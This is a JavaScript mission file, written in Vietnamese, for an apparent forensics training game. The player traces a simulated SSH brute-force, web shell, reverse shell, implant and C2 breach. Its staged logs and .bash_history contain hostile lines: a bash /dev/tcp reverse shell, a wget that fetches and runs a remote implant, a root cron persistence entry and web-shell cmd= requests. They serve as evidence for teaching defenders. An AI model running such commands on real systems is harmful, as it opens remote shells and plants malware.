// Chương 13 — Digital Forensics & Blue Team. 15 mission, FS inline, engine offline.
// Điều tra vụ breach từ cảnh báo SIEM tới xác định root-cause và IOC.
// Lệnh tool (strings/sha256sum/tcpdump/volatility) => có `output` đóng hộp tiếng Anh giống tool thật.
// Lệnh file-based (cat/grep/tail/head/ls/find) => KHÔNG đặt output; nội dung nằm trong initialFilesystem.
// Mạch truyện: SIEM alert -> brute-force SSH -> webshell -> reverse shell -> implant -> C2 -> exfil -> IOC.

const ROOT_FS = {
  '/': { type: 'dir' },
  '/home': { type: 'dir' },
  '/home/hacker': { type: 'dir' },
};

const AUTH_LOG = [
  'Jun 25 01:43:12 server sshd[9823]: Failed password for root from 192.168.1.105 port 51234 ssh2',
  'Jun 25 01:43:14 server sshd[9824]: Failed password for root from 192.168.1.105 port 51235 ssh2',
  'Jun 25 01:43:16 server sshd[9825]: Failed password for admin from 192.168.1.105 port 51236 ssh2',
  'Jun 25 01:43:18 server sshd[9826]: Failed password for admin from 192.168.1.105 port 51237 ssh2',
  'Jun 25 01:43:20 server sshd[9827]: Failed password for www-data from 192.168.1.105 port 51238 ssh2',
  'Jun 25 01:43:22 server sshd[9828]: Failed password for www-data from 192.168.1.105 port 51239 ssh2',
  'Jun 25 01:43:24 server sshd[9829]: Failed password for root from 192.168.1.105 port 51240 ssh2',
  'Jun 25 01:43:26 server sshd[9830]: Failed password for www-data from 192.168.1.105 port 51241 ssh2',
  'Jun 25 01:43:28 server sshd[9831]: Failed password for www-data from 192.168.1.105 port 51242 ssh2',
  'Jun 25 01:43:30 server sshd[9832]: Accepted password for www-data from 192.168.1.105 port 51243 ssh2',
  'Jun 25 01:43:32 server sshd[9832]: pam_unix(sshd:session): session opened for user www-data by (uid=0)',
  'Jun 25 01:43:35 server sudo[9833]:  www-data : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash',
  'Jun 25 03:12:47 server useradd[10102]: new user: name=svc_monitor, UID=0, GID=0, home=/root, shell=/bin/bash',
  'Jun 25 03:12:48 server passwd[10103]: password changed for svc_monitor',
].join('\n');

const NGINX_ACCESS_LOG = [
  '192.168.1.200 - - [25/Jun/2026:01:30:12 +0000] "GET /index.php HTTP/1.1" 200 4321 "-" "Mozilla/5.0"',
  '192.168.1.105 - - [25/Jun/2026:01:41:03 +0000] "GET /wp-admin/post.php HTTP/1.1" 404 215 "-" "curl/7.88"',
  '192.168.1.105 - - [25/Jun/2026:01:41:55 +0000] "POST /wp-content/uploads/shell.php?cmd=id HTTP/1.1" 200 48 "-" "curl/7.88"',
  '192.168.1.105 - - [25/Jun/2026:01:42:10 +0000] "POST /wp-content/uploads/shell.php?cmd=whoami HTTP/1.1" 200 44 "-" "curl/7.88"',
  '192.168.1.105 - - [25/Jun/2026:01:42:31 +0000] "POST /wp-content/uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1283 "-" "curl/7.88"',
  '192.168.1.105 - - [25/Jun/2026:01:43:05 +0000] "POST /wp-content/uploads/shell.php?cmd=bash+-i+>& /dev/tcp/192.168.1.105/4444 HTTP/1.1" 200 12 "-" "curl/7.88"',
  '192.168.1.200 - - [25/Jun/2026:02:15:44 +0000] "GET /product/42 HTTP/1.1" 200 8832 "-" "Mozilla/5.0"',
  '192.168.1.105 - - [25/Jun/2026:03:45:22 +0000] "POST /upload HTTP/1.1" 200 10485760 "-" "python-requests/2.28"',
].join('\n');

export default [
  // ── 1 ─────────────────────────────────────────────────────────────────────
  {
    id: 1,
    chapterId: 13,
    title: 'Phân loại cảnh báo SIEM',
    story:
      'Lúc 02:15 sáng SIEM kêu. Mày là người trực — phải nhanh chóng đọc alert, xác định loại tấn công và phạm vi điều tra trước khi leo thang lên sếp. Không đọc kỹ alert đầu tiên thì điều tra sẽ chạy sai hướng từ đầu.',
    steps: [
      {
        id: 'ls_siem',
        description: 'Liệt kê /var/log/siem để xem file alert nào có ở đó',
        match: /^ls\b.*siem/i,
      },
      {
        id: 'cat_alert',
        description: 'Đọc alert.txt để nắm loại tấn công, thời gian và IP nguồn',
        match: /^cat\b.*alert\.txt/i,
      },
    ],
    hints: [
      'SIEM đẩy alert vào /var/log/siem/. Trước tiên xem có file gì ở đó.',
      'Liệt kê: `ls /var/log/siem`. Thấy file nào thì đọc ngay.',
      'Đọc chi tiết cảnh báo: `cat /var/log/siem/alert.txt` — sẽ thấy loại tấn công, IP nguồn và hệ thống bị ảnh hưởng.',
    ],
    terms: [
      { term: 'SIEM', def: 'Security Information and Event Management — hệ thống tổng hợp và tương quan log từ nhiều nguồn để phát hiện tấn công.' },
      { term: 'Alert triage', def: 'Phân loại và đánh giá ưu tiên alert: xác nhận thật/false positive, mức độ nghiêm trọng, phạm vi ảnh hưởng.' },
      { term: 'Scope', def: 'Phạm vi bị ảnh hưởng của sự cố: bao nhiêu host, tài khoản, dữ liệu liên quan — xác định ngay từ đầu.' },
      { term: 'Runbook', def: 'Quy trình phản ứng được viết sẵn cho từng loại alert; giúp analyst không mất thời gian quyết định bước tiếp theo.' },
    ],
    debrief: [
      'Alert đầu tiên đặt khung cho toàn bộ điều tra: đọc sai hoặc bỏ qua là mất hàng giờ chạy nhầm hướng.',
      'SIEM không tự xác nhận tấn công thật — nó chỉ phát hiện pattern bất thường. Analyst phải xác nhận bằng log gốc.',
      'DEFENDER: SIEM cần được tune (giảm false positive); alert phải có runbook đi kèm; on-call rotation đảm bảo có người trực 24/7.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/var': { type: 'dir' },
      '/var/log': { type: 'dir' },
      '/var/log/siem': { type: 'dir' },
      '/var/log/siem/alert.txt': {
        type: 'file',
        content: [
          'SIEM ALERT — Severity: HIGH',
          'Time: 2026-06-25 02:15:07 UTC',
          'Rule: SSH Brute-Force followed by Successful Login',
          'Source IP: 192.168.1.105',
          'Destination: prod-web-01 (10.0.0.12) port 22',
          'Events: 9x Failed password in 18s, then 1x Accepted password',
          'User targeted: www-data',
          '',
          'Recommended investigation steps:',
          '1. Check /var/log/auth.log for full SSH event timeline',
          '2. Verify session activity and commands run after login',
          '3. Check for web shell in /var/www/html',
          '4. Check /var/log/nginx/access.log for pre-SSH web exploitation',
        ].join('\n'),
      },
    },
  },

  // ── 2 ─────────────────────────────────────────────────────────────────────
  {
    id: 2,
    chapterId: 13,
    title: 'Dấu vết brute-force SSH',
    story:
      'Alert nói có brute-force SSH. Mày cần xem auth.log để xác nhận: bao nhiêu lần thất bại, tài khoản nào bị thử, và pattern có khớp tool tự động không. Đây là bằng chứng đầu tiên ghi lại hành vi của kẻ tấn công.',
    steps: [
      {
        id: 'cat_auth',
        description: 'Đọc /var/log/auth.log để xem toàn bộ sự kiện SSH',
        match: /^cat\b.*auth\.log/i,
      },
      {
        id: 'grep_failed',
        description: 'Grep lọc riêng các dòng "Failed password" để đếm nỗ lực brute-force',
        match: /^grep\b.*Failed.password.*auth\.log/i,
      },
    ],
    hints: [
      'Log SSH nằm trong /var/log/auth.log. Đọc toàn bộ trước rồi mới lọc.',
      'Đọc log: `cat /var/log/auth.log`. Rồi đếm số lần thất bại.',
      'Lọc chỉ lần thất bại: `grep "Failed password" /var/log/auth.log` — thấy IP, user, port và timestamp của từng lần thử.',
    ],
    terms: [
      { term: 'auth.log', def: 'Log xác thực trên Linux (Debian/Ubuntu); ghi SSH login, sudo, su, PAM — nguồn điều tra chính cho identity-based attack.' },
      { term: 'Brute-force', def: 'Tự động thử nhiều mật khẩu liên tục; dấu hiệu: nhiều Failed password từ 1 IP trong khoảng thời gian ngắn.' },
      { term: 'Failed password', def: 'Chuỗi sshd ghi khi xác thực mật khẩu thất bại; kèm username, IP nguồn và port.' },
      { term: 'Credential stuffing', def: 'Dùng danh sách username/password từ breach cũ để thử tự động; khác brute-force chỗ không cần đoán mù.' },
    ],
    debrief: [
      '9 lần thất bại trong 18 giây từ 1 IP là dấu hiệu rõ ràng của tool tự động (Hydra/Medusa); tốc độ cao hơn 1 lần/2 giây thường là máy, không phải người.',
      'Attacker thử nhiều username (root, admin, www-data) — đây là credential stuffing hoặc username enumeration, không phải tấn công nhắm mục tiêu hẹp.',
      'DEFENDER: fail2ban tự động ban IP sau N lần thất bại; disable password auth, dùng key-only; chuyển SSH sang port không chuẩn; rate-limit tại firewall.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/var': { type: 'dir' },
      '/var/log': { type: 'dir' },
      '/var/log/auth.log': { type: 'file', content: AUTH_LOG },
    },
  },

  // ── 3 ─────────────────────────────────────────────────────────────────────
  {
    id: 3,
    chapterId: 13,
    title: 'Đăng nhập thành công của kẻ tấn công',
    story:
      'Brute-force cuối cùng thành công. Mày cần xác nhận thời điểm kẻ tấn công vào được, user nào bị dùng, và session diễn ra như thế nào sau đó. Đây là điểm mốc T0 của vụ xâm nhập.',
    steps: [
      {
        id: 'grep_accepted',
        description: 'Tìm dòng "Accepted password" trong auth.log để xác nhận login thành công',
        match: /^grep\b.*Accepted.password.*auth\.log/i,
      },
      {
        id: 'grep_session',
        description: 'Tìm dòng "session opened" để ghi nhận thời điểm session bắt đầu',
        match: /^grep\b.*session.opened.*auth\.log/i,
      },
    ],
    hints: [
      'Sau nhiều lần thất bại ắt có một lần thành công. Tìm dòng "Accepted" trong auth.log.',
      'Lọc login thành công: `grep "Accepted password" /var/log/auth.log` — thấy user và IP attacker.',
      'Xem session bắt đầu lúc nào: `grep "session opened" /var/log/auth.log` — ghi nhận chính xác T0 kẻ tấn công "vào trong".',
    ],
    terms: [
      { term: 'Accepted password', def: 'Chuỗi sshd ghi khi xác thực mật khẩu thành công; mốc đánh dấu kẻ tấn công đã có quyền truy cập.' },
      { term: 'pam_unix session opened', def: 'PAM ghi nhận session bắt đầu trong auth.log; kèm username và UID để biết quyền truy cập.' },
      { term: 'T0 (Time Zero)', def: 'Thời điểm ban đầu của sự cố — trong forensics là khi kẻ tấn công đạt được foothold đầu tiên.' },
      { term: 'Timeline', def: 'Dòng thời gian sắp xếp các sự kiện theo thứ tự; nền tảng của mọi báo cáo forensics.' },
    ],
    debrief: [
      'Tài khoản www-data bị chiếm là nguy hiểm: không phải tài khoản người dùng bình thường mà là service account của web server — kẻ tấn công có mục tiêu rõ ràng.',
      'Thời gian 01:43:30 UTC (3 giờ sáng giờ Việt Nam) là thời điểm giám sát thấp nhất — điển hình của tấn công có chủ đích.',
      'DEFENDER: log tập trung (SIEM) để phát hiện Accepted sau nhiều Failed trong thời gian ngắn; cảnh báo cho mọi service-account login thành công từ IP lạ.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/var': { type: 'dir' },
      '/var/log': { type: 'dir' },
      '/var/log/auth.log': { type: 'file', content: AUTH_LOG },
    },
  },

  // ── 4 ─────────────────────────────────────────────────────────────────────
  {
    id: 4,
    chapterId: 13,
    title: 'Xác định IP kẻ tấn công',
    story:
      'Từ log trước mày đã thấy IP 192.168.1.105. Giờ cần xác nhận toàn bộ hoạt động của IP này trong auth.log và đối chiếu với file thông tin IP đã chuẩn bị. Một IP có thể xuất hiện trong nhiều event — phải gom hết để vẽ bức tranh đầy đủ.',
    steps: [
      {
        id: 'grep_ip',
        description: 'Grep lọc toàn bộ sự kiện từ IP 192.168.1.105 trong auth.log',
        match: /^grep\b.*192\.168\.1\.105.*auth\.log/i,
      },
      {
        id: 'cat_ip_info',
        description: 'Đọc file ip_info.txt để xác định nguồn gốc và ngữ cảnh threat intel',
        match: /^cat\b.*ip_info\.txt/i,
      },
    ],
    hints: [
      'IP kẻ tấn công đã lộ trong log. Grep toàn bộ auth.log theo IP đó để gom hết sự kiện liên quan.',
      'Lọc theo IP: `grep "192.168.1.105" /var/log/auth.log` — tất cả dòng liên quan đến IP này sẽ hiện ra.',
      'Đọc thêm ngữ cảnh: `cat /home/hacker/ip_info.txt` — ASN, quốc gia và lịch sử threat intelligence về IP này.',
    ],
    terms: [
      { term: 'IOC (Indicator of Compromise)', def: 'Dấu hiệu xâm phạm: IP, domain, hash file — dùng để nhận biết tấn công trong log và threat intel.' },
      { term: 'ASN', def: 'Autonomous System Number — nhóm IP do một tổ chức quản lý; giúp xác định ISP hoặc VPN/proxy mà attacker dùng.' },
      { term: 'Threat intelligence', def: 'Thông tin về mối đe doạ đã biết: IP độc, malware hash, TTP — giúp bối cảnh hoá sự cố điều tra.' },
      { term: 'RFC 1918', def: 'Dải IP private (10.x, 172.16-31.x, 192.168.x) không định tuyến trên Internet; IP private trong log gợi ý attacker đang trong mạng nội bộ.' },
    ],
    debrief: [
      'Một IP thường để lại dấu vết ở nhiều nguồn log — auth.log, access.log, firewall — việc tổng hợp chúng là bước đầu dựng IOC.',
      'IP 192.168.1.105 là địa chỉ private (RFC 1918) — gợi ý attacker có thể đang trong cùng mạng nội bộ hoặc đã pivot từ máy khác bị chiếm trước.',
      'DEFENDER: gửi IOC (IP, domain, hash) vào SIEM và EDR để block và hunt ngay lập tức; chia sẻ với ISAC của ngành; isolate host nghi ngờ.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/var': { type: 'dir' },
      '/var/log': { type: 'dir' },
      '/var/log/auth.log': { type: 'file', content: AUTH_LOG },
      '/home/hacker/ip_info.txt': {
        type: 'file',
        content: [
          'IP: 192.168.1.105',
          'Type: Private / Internal network (RFC 1918)',
          'ASN: N/A (internal address)',
          'Subnet: 192.168.1.0/24 (same internal LAN as prod-web-01)',
          '',
          'Threat intel: No external reputation data (private IP).',
          'This IP is internal — attacker may be:',
          '  (a) An insider threat on the LAN',
          '  (b) A compromised internal host used as pivot',
          '',
          'Recommendation: Isolate 192.168.1.105 and investigate its own logs.',
        ].join('\n'),
      },
    },
  },

  // ── 5 ─────────────────────────────────────────────────────────────────────
  {
    id: 5,
    chapterId: 13,
    title: 'Lịch sử lệnh của kẻ tấn công',
    story:
      'Kẻ tấn công đã đăng nhập bằng user www-data. Sau đó chúng làm gì? .bash_history là cuốn nhật ký bất cẩn nhất mà kẻ tấn công để lại — kể cả khi chúng cố xoá thì đôi khi vẫn còn sót. Tìm dấu vết reverse shell trong đó.',
    steps: [
      {
        id: 'cat_history',
        description: 'Đọc .bash_history của www-data để xem lệnh đã chạy sau khi đăng nhập',
        match: /^cat\b.*bash_history/i,
      },
      {
        id: 'grep_revshell',
        description: 'Grep tìm /dev/tcp — dấu hiệu reverse shell bash trong bash_history',
        match: /^grep\b.*\/dev\/tcp/i,
      },
    ],
    hints: [
      '.bash_history lưu lịch sử lệnh đã chạy. Với user www-data, file này ở /home/www-data/.',
      'Đọc lịch sử: `cat /home/www-data/.bash_history`. Tìm lệnh bất thường.',
      'Grep tìm reverse shell: `grep "/dev/tcp" /home/www-data/.bash_history` — dòng chứa /dev/tcp là kẻ tấn công mở kết nối TCP ra ngoài.',
    ],
    terms: [
      { term: '.bash_history', def: 'File lưu lịch sử lệnh bash của user; thường ở ~/.bash_history; bằng chứng forensics quan trọng về hành vi sau xâm nhập.' },
      { term: 'Reverse shell', def: 'Shell kết nối từ máy nạn nhân RA máy attacker (ngược chiều); vượt qua firewall inbound vì kết nối là outbound.' },
      { term: '/dev/tcp', def: 'Tính năng bash cho phép mở TCP socket qua /dev/tcp/IP/PORT — hay được dùng trong reverse shell one-liner không cần tool.' },
      { term: 'Anti-forensics', def: 'Kỹ thuật xoá dấu vết: rm .bash_history, HISTSIZE=0 — nhưng đôi khi file sync chưa kịp xoá hoặc có bản sao ở /proc.' },
    ],
    debrief: [
      '.bash_history là nguồn bằng chứng quý nhưng dễ bị xoá — kẻ tấn công kinh nghiệm thường set HISTFILE=/dev/null hoặc kill -9 shell để không ghi log.',
      'Reverse shell qua /dev/tcp là kỹ thuật cơ bản nhất không cần tool bên ngoài — chỉ cần bash và kết nối TCP ra ngoài; vì vậy rất khó block hoàn toàn.',
      'DEFENDER: auditd ghi lại MỌI lệnh kể cả khi .bash_history bị xoá; forward shell history và auditd log ra SIEM ngay lập tức; syslog-ng/rsyslog không để attacker xoá.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/home/www-data': { type: 'dir' },
      '/home/www-data/.bash_history': {
        type: 'file',
        content: [
          'id',
          'whoami',
          'uname -a',
          'cat /etc/passwd',
          'ls /var/www/html',
          'cat /var/www/html/config.php',
          'ps aux',
          'netstat -tulpn',
          'bash -i >& /dev/tcp/192.168.1.105/4444 0>&1',
          'wget http://192.168.1.105/implant -O /tmp/.x/implant',
          'chmod +x /tmp/.x/implant',
          '/tmp/.x/implant &',
          'echo "*/5 * * * * root /tmp/.x/implant" > /etc/cron.d/apache-backup',
        ].join('\n'),
      },
    },
  },

  // ── 6 ─────────────────────────────────────────────────────────────────────
  {
    id: 6,
    chapterId: 13,
    title: 'Web shell trong access log',
    story:
      'Trước khi brute-force SSH, kẻ tấn công đã khai thác web. Access log của nginx ghi lại toàn bộ HTTP request — bao gồm các request gọi web shell. Tìm dòng có tham số cmd= là ra ngay đường tấn công ban đầu.',
    steps: [
      {
        id: 'cat_access',
        description: 'Đọc nginx access.log để xem toàn bộ HTTP request của ngày hôm đó',
        match: /^cat\b.*access\.log/i,
      },
      {
        id: 'grep_webshell',
        description: 'Grep lọc request có tham số cmd= — dấu hiệu web shell bị gọi',
        match: /^grep\b.*cmd=.*access\.log/i,
      },
    ],
    hints: [
      'Access log của nginx ghi lại mọi HTTP request, kể cả request tới web shell. Tìm kiếm trong đó.',
      'Đọc log: `cat /var/log/nginx/access.log`. Tìm dòng bất thường từ IP 192.168.1.105.',
      'Lọc web shell request: `grep "cmd=" /var/log/nginx/access.log` — thấy URL chứa các lệnh shell đã chạy qua web shell.',
    ],
    terms: [
      { term: 'Web shell', def: 'Script (PHP/ASPX/JSP) upload lên server cho phép thực thi lệnh OS qua HTTP request; cửa hậu dạng web.' },
      { term: 'Access log', def: 'Log ghi mọi HTTP request tới web server: IP, method, URL, status code, byte — bằng chứng chính cho web attack.' },
      { term: 'URL encoding', def: 'Mã hoá ký tự đặc biệt trong URL: %2F=/,  %20=space; request tới web shell thường chứa lệnh URL-encoded.' },
      { term: 'Remote Code Execution (RCE)', def: 'Thực thi lệnh tuỳ ý trên server từ xa; web shell là một hình thức RCE sau khi upload file PHP thành công.' },
    ],
    debrief: [
      'Thứ tự tấn công rõ dần: upload web shell → RCE kiểm tra quyền → reverse shell ra ngoài → SSH brute-force để có shell ổn định hơn.',
      'Web shell trong /wp-content/uploads/ là pattern cực phổ biến: WordPress cho phép upload file nhưng thường không lọc đuôi .php.',
      'DEFENDER: kiểm tra MIME type + extension ở server side; Web Application Firewall (ModSecurity) chặn request có pattern ?cmd=; alert khi file PHP xuất hiện trong /uploads/.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/var': { type: 'dir' },
      '/var/log': { type: 'dir' },
      '/var/log/nginx': { type: 'dir' },
      '/var/log/nginx/access.log': { type: 'file', content: NGINX_ACCESS_LOG },
    },
  },

  // ── 7 ─────────────────────────────────────────────────────────────────────
  {
    id: 7,
    chapterId: 13,
    title: 'Persistence qua cron độc',
    story:
      'Kẻ tấn công không muốn mất quyền truy cập nếu reverse shell bị drop. Chúng cắm persistence qua cron để implant tự khởi động lại mỗi 5 phút. /etc/cron.d/ là nơi thường bị lạm dụng vì ít người chú ý.',
    steps: [
      {
        id: 'ls_crond',
        description: 'Liệt kê /etc/cron.d để tìm file cron bất thường',
        match: /^ls\b.*\/etc\/cron/i,
      },
      {
        id: 'cat_cron',
        description: 'Đọc file cron nghi ngờ để xem lệnh được lên lịch',
        match: /^cat\b.*apache-backup/i,
      },
    ],
    hints: [
      'Kẻ tấn công hay cắm persistence qua /etc/cron.d/. Xem có file lạ nào không.',
      'Liệt kê: `ls /etc/cron.d`. Tìm file có tên giả vờ hợp lệ như "apache-backup".',
      'Đọc nội dung file cron nghi ngờ: `cat /etc/cron.d/apache-backup` — thấy lệnh chạy implant mỗi 5 phút với quyền root.',
    ],
    terms: [
      { term: '/etc/cron.d/', def: 'Thư mục chứa crontab của system; mỗi file là một crontab riêng — dễ bị attacker thêm file độc mà ít ai để ý.' },
      { term: 'Persistence', def: 'Kỹ thuật đảm bảo attacker giữ được quyền truy cập dù server restart hoặc reverse shell bị ngắt.' },
      { term: 'Masquerading', def: 'Đặt tên file độc giống tên hợp lệ (apache-backup, syslog-rotate) để tránh bị phát hiện khi audit thủ công.' },
      { term: 'Living off the land', def: 'Tận dụng công cụ có sẵn (cron, bash, wget) thay vì tool riêng để né antivirus và giảm dấu vết.' },
    ],
    debrief: [
      'Tên file "apache-backup" cố tình ngụy trang như cron job hợp lệ — đây là kỹ thuật masquerading phổ biến để qua mặt audit thủ công.',
      'Cron chạy với USER=root + mỗi 5 phút = implant sẽ sống lại ngay cả khi bị kill thủ công; cần xoá file cron TRƯỚC khi kill process.',
      'DEFENDER: File Integrity Monitoring (FIM) trên /etc/cron.d/; alert khi cron entry mới xuất hiện; audit định kỳ toàn bộ cron entry; auditd theo dõi write vào /etc/cron.d/',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/etc': { type: 'dir' },
      '/etc/cron.d': { type: 'dir' },
      '/etc/cron.d/apache-backup': {
        type: 'file',
        content: [
          '# Apache log rotation task — DO NOT REMOVE',
          '*/5 * * * * root /tmp/.x/implant > /dev/null 2>&1',
        ].join('\n'),
      },
    },
  },

  // ── 8 ─────────────────────────────────────────────────────────────────────
  {
    id: 8,
    chapterId: 13,
    title: 'Persistence qua authorized_keys',
    story:
      'Ngoài cron, kẻ tấn công còn cắm SSH key của mình vào /root/.ssh/authorized_keys để có backdoor SSH vĩnh cửu — không cần mật khẩu, không bị brute-force detection. Key lạ trong đây là bằng chứng persistence nguy hiểm nhất.',
    steps: [
      {
        id: 'ls_ssh',
        description: 'Liệt kê /root/.ssh để xem các file SSH của root',
        match: /^ls\b.*\.ssh/i,
      },
      {
        id: 'cat_authkeys',
        description: 'Đọc authorized_keys để phát hiện SSH public key lạ của kẻ tấn công',
        match: /^cat\b.*authorized_keys/i,
      },
    ],
    hints: [
      'Kẻ tấn công có thể thêm SSH key của mình vào /root/.ssh/authorized_keys để vào lại bất cứ lúc nào mà không cần mật khẩu.',
      'Xem thư mục: `ls /root/.ssh`. Nếu có authorized_keys thì đọc ngay.',
      'Đọc: `cat /root/.ssh/authorized_keys` — key nào không quen là key attacker đã cắm vào để backdoor.',
    ],
    terms: [
      { term: 'authorized_keys', def: 'File chứa danh sách SSH public key được phép đăng nhập vào tài khoản đó mà không cần mật khẩu.' },
      { term: 'SSH key backdoor', def: 'Attacker thêm public key của mình vào authorized_keys; vào lại bất kỳ lúc nào mà không cần biết mật khẩu hiện tại.' },
      { term: 'Ed25519', def: 'Thuật toán SSH key dựa trên đường cong elliptic; nhanh và an toàn; thường được attacker dùng trong key backdoor hiện đại.' },
      { term: 'FIM (File Integrity Monitoring)', def: 'Giám sát thay đổi file quan trọng như authorized_keys; tool phổ biến: AIDE, Tripwire, auditd, Wazuh.' },
    ],
    debrief: [
      'SSH key backdoor là persistence nguy hiểm nhất: không bị fail2ban phát hiện, không cần mật khẩu, hoạt động mãi tới khi bị remove thủ công.',
      'Key comment "github-deploy-bot" là masquerading — cố vẻ như deployment key hợp lệ; cần so sánh với danh sách key được phê duyệt mới phát hiện được.',
      'DEFENDER: FIM (auditd/AIDE) alert khi authorized_keys thay đổi; audit authorized_keys định kỳ và so với baseline; dùng SSH CA certificate thay key tĩnh để dễ revoke.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/root': { type: 'dir' },
      '/root/.ssh': { type: 'dir' },
      '/root/.ssh/authorized_keys': {
        type: 'file',
        content: [
          '# Authorized SSH keys for root',
          'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB3xK2kzPx7eFmNwR5oq9XtdQzUaLPcHvYmNkj8ZqR2w root@prod-server',
          'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAttackerKeyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX github-deploy-bot',
        ].join('\n'),
      },
    },
  },

  // ── 9 ─────────────────────────────────────────────────────────────────────
  {
    id: 9,
    chapterId: 13,
    title: 'Phân tích tĩnh mã độc (implant)',
    story:
      'Kẻ tấn công tải về và chạy một file tên "implant" vào /tmp/.x/. Mày cần phân tích file này mà không chạy nó: dùng strings để xem chuỗi in được bên trong, rồi tính SHA256 để tra VirusTotal. Đây là static analysis cơ bản nhất của malware forensics.',
    steps: [
      {
        id: 'find_implant',
        description: 'Tìm file implant trong /tmp để xác định đường dẫn chính xác',
        match: /^find\b.*implant/i,
      },
      {
        id: 'strings_implant',
        description: 'Chạy strings để trích xuất chuỗi in được trong binary — lộ C2 và khả năng',
        match: /^strings\b.*implant/i,
        output: [
          '/lib64/ld-linux-x86-64.so.2',
          'libpthread.so.0',
          'libcrypto.so.1.1',
          'strcpy',
          'execve',
          '/bin/sh',
          '192.168.1.105',
          '4444',
          'GET /beacon HTTP/1.1',
          'Host: 192.168.1.105',
          'User-Agent: Mozilla/5.0 (compatible)',
          'X-Session-ID: ',
          'cmd',
          '/tmp/.x/',
          'persist',
          'self_delete',
        ].join('\n'),
      },
      {
        id: 'sha256_implant',
        description: 'Tính SHA256 hash của implant để tra VirusTotal / threat intel',
        match: /^sha256sum\b.*implant/i,
        output: 'a3f2b8c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1  /tmp/.x/implant',
      },
    ],
    hints: [
      'File implant nằm đâu đó trong /tmp/. Tìm đường dẫn chính xác trước khi phân tích.',
      'Tìm file: `find /tmp -name implant`. Sau đó dùng strings để đọc chuỗi bên trong binary.',
      'Phân tích tĩnh: `strings /tmp/.x/implant` để thấy địa chỉ C2 và khả năng malware. Rồi `sha256sum /tmp/.x/implant` để lấy hash tra VirusTotal.',
    ],
    terms: [
      { term: 'Static analysis', def: 'Phân tích file malware mà không chạy nó; dùng strings, xxd, disassembler để hiểu hành vi mà không gây lây nhiễm thêm.' },
      { term: 'strings', def: 'Tool trích xuất chuỗi ASCII/Unicode in được từ binary; nhanh chóng lộ C2 IP, URL, tên function, hardcoded config.' },
      { term: 'SHA256', def: 'Hash 256-bit của file; fingerprint duy nhất dùng để tra VirusTotal hoặc so sánh với threat intel database.' },
      { term: 'C2 (Command & Control)', def: 'Máy chủ attacker dùng để điều khiển malware; địa chỉ C2 thường lộ trong strings của implant.' },
    ],
    debrief: [
      'strings lộ ngay địa chỉ C2 (192.168.1.105:4444), beacon endpoint (/beacon), và khả năng: execute shell, persist, self-delete — đủ để đánh giá mức độ nguy hiểm trước khi phân tích sâu hơn.',
      'SHA256 hash là IOC dạng file — submit lên VirusTotal; nếu hash khớp malware đã biết sẽ có báo cáo đầy đủ về hành vi, family và attribution.',
      'DEFENDER: EDR phát hiện binary lạ ngay khi tạo/chạy; YARA rules match chuỗi đặc trưng (beacon path, C2 IP); mount /tmp với noexec để ngăn execute file tải về.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/tmp': { type: 'dir' },
      '/tmp/.x': { type: 'dir' },
      '/tmp/.x/implant': { type: 'file', content: '[ELF binary — use strings/sha256sum to analyze]' },
    },
  },

  // ── 10 ────────────────────────────────────────────────────────────────────
  {
    id: 10,
    chapterId: 13,
    title: 'Lưu lượng C2 trong pcap',
    story:
      'Network team đã capture traffic nghi ngờ từ server. Mày cần đọc file pcap để xác nhận kết nối C2: IP đích, port, và pattern beacon. tcpdump có thể đọc pcap offline mà không cần chụp traffic mới.',
    steps: [
      {
        id: 'tcpdump_pcap',
        description: 'Đọc pcap bằng tcpdump để xem toàn bộ kết nối đã capture',
        match: /^tcpdump\b.*capture\.pcap/i,
        output: [
          'reading from file /home/hacker/capture.pcap, link-type EN10MB (Ethernet)',
          '01:43:31.002341 IP 10.0.0.12.45123 > 192.168.1.105.4444: Flags [S], seq 0, win 64240, length 0',
          '01:43:31.050012 IP 192.168.1.105.4444 > 10.0.0.12.45123: Flags [SA], seq 0, ack 1, win 65535, length 0',
          '01:43:31.050089 IP 10.0.0.12.45123 > 192.168.1.105.4444: Flags [.], ack 1, win 64240, length 0',
          '01:45:00.003421 IP 10.0.0.12.38821 > 192.168.1.105.8080: Flags [P.] HTTP GET /beacon HTTP/1.1 Host: 192.168.1.105',
          '01:50:00.004102 IP 10.0.0.12.38822 > 192.168.1.105.8080: Flags [P.] HTTP GET /beacon HTTP/1.1 Host: 192.168.1.105',
          '01:55:00.005231 IP 10.0.0.12.38823 > 192.168.1.105.8080: Flags [P.] HTTP GET /beacon HTTP/1.1 Host: 192.168.1.105',
          '02:00:00.006108 IP 10.0.0.12.38824 > 192.168.1.105.8080: Flags [P.] HTTP GET /beacon HTTP/1.1 Host: 192.168.1.105',
          '03:45:21.100234 IP 10.0.0.12.55001 > 192.168.1.105.8080: Flags [P.] HTTP POST /exfil HTTP/1.1 Content-Length: 10485760',
        ].join('\n'),
      },
      {
        id: 'grep_beacon',
        description: 'Grep xác nhận pattern beacon đều đặn trong network.log',
        match: /^grep\b.*beacon.*network\.log|^grep\b.*network\.log.*beacon/i,
      },
    ],
    hints: [
      'tcpdump có thể đọc pcap đã capture offline — không cần chụp traffic mới. File pcap nằm trong /home/hacker/.',
      'Đọc pcap: `tcpdump -nr /home/hacker/capture.pcap`. Chú ý TCP handshake ban đầu và pattern beacon sau đó.',
      'Xác nhận beacon trong network log: `grep "beacon" /home/hacker/network.log` — thấy kết nối đều 5 phút/lần là dấu hiệu C2 beaconing.',
    ],
    terms: [
      { term: 'pcap', def: 'Packet capture file — lưu toàn bộ network packet đã bắt; đọc bằng tcpdump -r hoặc Wireshark.' },
      { term: 'tcpdump -nr', def: '-n: không resolve DNS (nhanh hơn); -r: đọc từ file pcap thay vì bắt live traffic.' },
